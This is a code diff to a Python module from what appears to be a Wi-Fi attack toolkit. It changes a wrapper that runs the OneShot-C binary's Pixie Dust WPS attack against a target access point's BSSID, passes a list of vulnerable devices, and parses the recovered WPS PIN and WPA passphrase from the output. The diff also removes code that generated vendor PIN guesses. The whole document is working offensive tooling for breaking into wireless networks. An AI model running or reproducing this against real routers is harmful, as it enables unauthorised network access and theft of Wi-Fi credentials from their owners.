@@ -1,24 +1,24 @@
 # -*- coding: utf-8 -*-
-"""OneShot pixie fallback + static/vendor PIN candidates.
+"""OneShot-C pixie fallback (managed mode, no monitor).
 
-OneShot runs in managed mode (wpa_supplicant + pixiewps). Vendor PINs are a
-capped set from OneShot's WPSpin (MAC/static/empty) — never online 10M BF.
+OneShot-C is the C rewrite of the old drygdryg/kimocoder OneShot: Pixie Dust +
+static/vendor PIN prediction via wpa_supplicant + pixiewps. We drive the
+compiled binary directly (tools/oneshot/oneshot). Online 10M PIN brute-force is
+never used — only the single-shot -K pixie attempt.
 """
-import importlib.util
 import os
 import re
 import select
 import subprocess
-import sys
 import time
 
 import config
 from attack import tools
 from attack.model import AttackEvent, EventType
 
-ONESHOT_PY = os.path.join(config.PROJECT_DIR, "tools", "oneshot", "oneshot.py")
-VENDOR_MAX = 3
-VENDOR_TRY_SEC = 10
+ONESHOT_DIR = os.path.join(config.PROJECT_DIR, "tools", "oneshot")
+ONESHOT_BIN = os.path.join(ONESHOT_DIR, "oneshot")
+ONESHOT_VULN = os.path.join(ONESHOT_DIR, "vulnwsc.txt")
 ONESHOT_MAX_SEC = 25
 
 _PIN_RE = re.compile(
@@ -30,52 +30,11 @@ _PSK_RE = re.compile(
 
 
 def available():
-    return (os.path.isfile(ONESHOT_PY)
+    return (os.path.isfile(ONESHOT_BIN)
+            and os.access(ONESHOT_BIN, os.X_OK)
             and bool(tools.which("pixiewps", "/usr/bin/pixiewps"))
             and bool(tools.which("wpa_supplicant", "/sbin/wpa_supplicant",
                                  "/usr/sbin/wpa_supplicant")))
-
-
-def _load_wpspin():
-    if not os.path.isfile(ONESHOT_PY):
-        return None
-    try:
-        spec = importlib.util.spec_from_file_location("oneshot_vendored", ONESHOT_PY)
-        if not spec or not spec.loader:
-            return None
-        mod = importlib.util.module_from_spec(spec)
-        # Avoid running oneshot's CLI main
-        sys.modules["oneshot_vendored"] = mod
-        spec.loader.exec_module(mod)
-        return mod.WPSpin()
-    except Exception as e:  # noqa: BLE001
-        tools.log("oneshot load fail: %s" % e)
-        return None
-
-
-def vendor_candidates(bssid, limit=VENDOR_MAX):
-    """OUI-matched suggested PINs only — never grind generic MAC algos."""
-    gen = _load_wpspin()
-    if not gen:
-        return []
-    out = []
-    seen = set()
-    try:
-        suggested = gen.getSuggested(bssid) or []
-    except Exception:  # noqa: BLE001
-        suggested = []
-    for item in suggested:
-        pin = item.get("pin")
-        if pin is None:
-            continue
-        pin = str(pin)
-        if pin == "" or pin in seen:
-            continue
-        seen.add(pin)
-        out.append({"algo": item.get("id") or "suggest", "pin": pin})
-        if len(out) >= limit:
-            break
-    return out
 
 
 def _parse_creds(text):
@@ -94,7 +53,7 @@ def _parse_creds(text):
 
 
 def run_pixie(iface, target, emit, stop_flag, timeout=60):
-    """Managed-mode OneShot -K. Returns {ok, pin, psk, reason, t}."""
+    """Managed-mode OneShot-C -K. Returns {ok, pin, psk, reason, t}."""
     bssid = target.get("bssid")
     essid = target.get("essid") or bssid
     if not available():
@@ -102,7 +61,8 @@ def run_pixie(iface, target, emit, stop_flag, timeout=60):
     if not iface or not bssid:
         return {"ok": False, "reason": "no iface", "t": 0.0}
 
-    cmd = [sys.executable, ONESHOT_PY, "-i", iface, "-b", bssid, "-K", "-v"]
+    cmd = [ONESHOT_BIN, "-i", iface, "-b", bssid, "-K", "-v",
+           "--vuln-list", ONESHOT_VULN]
     tools.log("oneshot spawn: %s" % " ".join(cmd))
     emit(AttackEvent(EventType.PHASE, essid=essid, bssid=bssid,
                      phase="OSHOT", countdown=timeout, cd_max=timeout))
@@ -147,9 +107,6 @@ def run_pixie(iface, target, emit, stop_flag, timeout=60):
                 psk = k
                 reason = "ok"
                 break
-            if pin is not None and re.search(
-                    r"WPA PSK|PSk|passphrase|connected", line, re.I):
-                pass
             if re.search(r"No suitable network found|Unable to connect|"
                          r"Network not found", line, re.I):
                 reason = "no ap"
